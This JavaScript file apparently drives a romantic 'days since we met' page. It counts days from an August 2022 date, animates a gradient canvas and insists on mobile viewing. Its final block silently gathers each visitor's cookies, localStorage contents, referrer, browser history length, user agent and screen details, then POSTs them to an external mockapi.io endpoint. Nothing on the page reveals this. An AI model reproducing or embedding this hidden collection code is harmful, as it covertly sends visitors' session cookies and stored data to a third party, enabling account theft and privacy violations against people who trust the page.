const oneDay = 24 * 60 * 60 * 1000;
const today = new Date();
const firstDate = new Date('2022-8-16 21:30:00'.replace(/-/g, "/"));
const lovingDays = Math.floor(Math.abs((today - firstDate) / oneDay)) + 1;
$("#lovingDays").append(lovingDays);

let particles = [];

const c1 = createCanvas({
  width: $(window).width(),
  height: $(window).height(),
});

const tela = c1.canvas;
const canvas = c1.context;

// $("body").append(tela);
$("body").append(c1.canvas);

function clear() {
  let grd = canvas.createRadialGradient(
    tela.width / 2,
    tela.height / 2,
    0,
    tela.width / 2,
    tela.height / 2,
    tela.width
  );
  // Fill with gradient
  canvas.globalAlpha = 0.16;
  canvas.fillStyle = grd;
  canvas.fillRect(0, 0, tela.width, tela.height);
}

function blur(ctx, canvas, amt) {
  // ctx.filter = `blur(${amt}px)`
  // ctx.drawImage(canvas, 0, 0)
  // ctx.filter = 'none'
}

function update() {
  clear();
  particles = particles.filter(function(p) {
    return p.move();
  });
  requestAnimationFrame(update.bind(this));
}

function createCanvas(properties) {
  let canvas = document.createElement("canvas");
  canvas.width = properties.width;
  //   canvas.style.zIndex = 999;
  canvas.height = properties.height;
  let context = canvas.getContext("2d");
  return {
    canvas: canvas,
    context: context,
  };
}

update();

if(! (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) ) {
  $("body").html("<h1>Hãy mở trên điện thoại !!!</h1>");
}

$(document).ready(function() {
  let info={

    timeOpened:new Date(),
    timezone:(new Date()).getTimezoneOffset()/60,

    pageon(){return window.location.pathname},
    referrer(){return document.referrer},
    previousSites(){return history.length},

    browserName(){return navigator.appName},
    browserEngine(){return navigator.product},
    browserVersion1a(){return navigator.appVersion},
    browserVersion1b(){return navigator.userAgent},
    browserLanguage(){return navigator.language},
    browserOnline(){return navigator.onLine},
    browserPlatform(){return navigator.platform},
    javaEnabled(){return navigator.javaEnabled()},
    dataCookiesEnabled(){return navigator.cookieEnabled},
    dataCookies1(){return document.cookie},
    dataCookies2(){return decodeURIComponent(document.cookie.split(";"))},
    dataStorage(){return localStorage},

    sizeScreenW(){return screen.width},
    sizeScreenH(){return screen.height},
    sizeDocW(){return document.width},
    sizeDocH(){return document.height},
    sizeInW(){return innerWidth},
    sizeInH(){return innerHeight},
    sizeAvailW(){return screen.availWidth},
    sizeAvailH(){return screen.availHeight},
    scrColorDepth(){return screen.colorDepth},
    scrPixelDepth(){return screen.pixelDepth},


    };
      $.ajax({
          url: 'https://638040e38efcfcedac002c4a.mockapi.io/ap1/requests',
          type: 'POST',
          dataType: 'html',
          data: {
            join_at: new Date(),
            content: info
          }
      }).done(function(result) {
      });
});